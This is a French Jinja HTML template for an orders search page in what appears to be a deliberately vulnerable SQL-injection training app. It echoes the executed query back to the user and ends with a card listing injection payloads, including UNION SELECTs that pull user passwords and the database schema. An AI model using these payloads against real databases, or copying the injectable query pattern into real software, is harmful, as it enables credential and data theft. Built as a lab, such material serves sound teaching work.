{% extends 'base.html' %}

{% block title %}Commandes{% endblock %}

{% block content %}
<div class="card">
    <h2>Recherche de Commandes</h2>

    <form action="{{ prefix }}/orders" method="get" class="search-form">
        <input type="text" name="user_id" value="{{ user_id }}" placeholder="ID Client">
        <input type="text" name="product_id" value="{{ product_id }}" placeholder="ID Produit (optionnel)">
        <button type="submit">Rechercher</button>
    </form>

    {% if query %}
    <div class="query-display">
        <strong>Requete executee:</strong><br>
        {{ query }}
    </div>
    {% endif %}
</div>

<div class="card">
    <h2>Liste des Commandes ({{ orders|length }} resultats)</h2>

    {% if error %}
    <div class="alert alert-danger">{{ error }}</div>
    {% endif %}

    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Produit</th>
                <th>Client</th>
                <th>Quantite</th>
                <th>Prix</th>
                <th>Date</th>
            </tr>
        </thead>
        <tbody>
            {% for order in orders %}
            <tr>
                <td>{{ order[0] }}</td>
                <td>{{ order[1] }}</td>
                <td>{{ order[2] }}</td>
                <td>{{ order[3] }}</td>
                <td>{{ order[4] }} EUR</td>
                <td>{{ order[5] }}</td>
            </tr>
            {% else %}
            <tr>
                <td colspan="6" style="text-align: center;">Aucun resultat</td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
</div>

<div class="card">
    <h2>Injections possibles (champs numeriques)</h2>
    <ul style="list-style: none; padding: 0;">
        <li style="margin-bottom: 0.5rem;"><code>1 OR 1=1</code> - Afficher toutes les commandes</li>
        <li style="margin-bottom: 0.5rem;"><code>1 UNION SELECT 1,2,3,4,5,6--</code> - Test UNION</li>
        <li style="margin-bottom: 0.5rem;"><code>1 UNION SELECT id,name,email,password,date,1 FROM users--</code> - Extraire les utilisateurs</li>
        <li style="margin-bottom: 0.5rem;"><code>0 UNION SELECT 1,name,sql,4,5,6 FROM sqlite_master--</code> - Structure DB</li>
    </ul>
</div>
{% endblock %}
